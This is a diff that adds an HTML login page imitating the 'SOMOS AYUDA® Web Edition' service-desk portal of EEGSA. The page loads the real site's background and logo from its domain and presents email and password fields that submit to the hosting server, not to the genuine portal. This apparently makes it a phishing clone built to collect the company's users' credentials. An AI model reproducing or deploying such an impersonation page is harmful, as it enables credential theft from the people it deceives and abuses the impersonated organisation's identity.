@@ -1,0 +1,108 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>SOMOS AYUDA® Web Edition</title>
+    <style>
+        body {
+            background-image: url('https://somosayuda.eegsa.net/afs/ServiceDesk/General/1/loginImages_LoginBackEEGSA.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: Glober-SemiBold, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            padding: 20px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            background-color: transparent; /* Fondo transparente */
+        }
+
+        .container label {
+            display: block;
+            color: yellow;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .container h1 {
+            color: yellow;
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 10px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .container select,
+        .container input[type="email"],
+        .container input[type="password"],
+        .container input[type="submit"] {
+            padding: 12px;
+            width: 30%;
+            max-width: 300px;
+            margin-right: 10px;
+            border: none;
+            border-radius: 3px;
+            background-color: white;
+            font-size: 18px;
+            color: #999999;
+        }
+
+        .container input[type="email"]::placeholder,
+        .container input[type="password"]::placeholder {
+            color: #999999;
+        }
+
+        .container input[type="submit"] {
+            background-color: rgba(64, 64, 64, 0.8);
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            width: 10%;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-container img {
+            width: 100%;
+            max-width: 600px;
+        }
+    </style>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://somosayuda.eegsa.net/afs/ServiceDesk/General/1/loginLogo_LogoLoginEEGSA1.png" alt="Logo" style="width: 120%;">
+        </div>
+        <form method="POST" action="/">
+            <h1><strong>Customer Portal</strong> | Enter</h1>
+            <label for="selector" style="font-size: 14px; color: yellow;">Authentication type</label>
+            <div style="display: flex; align-items: center;">
+                <select name="selector" id="selector">
+                    <option value="EGGSA">EGGSA</option>
+                    <option value="ARANDA">ARANDA</option>
+                </select>
+                <input type="email" name="correo" placeholder="User..." required>
+                <input type="password" name="contrasena" placeholder="Password..." required>
+                <input type="submit" value="Enter">
+            </div>
+        </form>
+    </div>
+</body>
+</html>
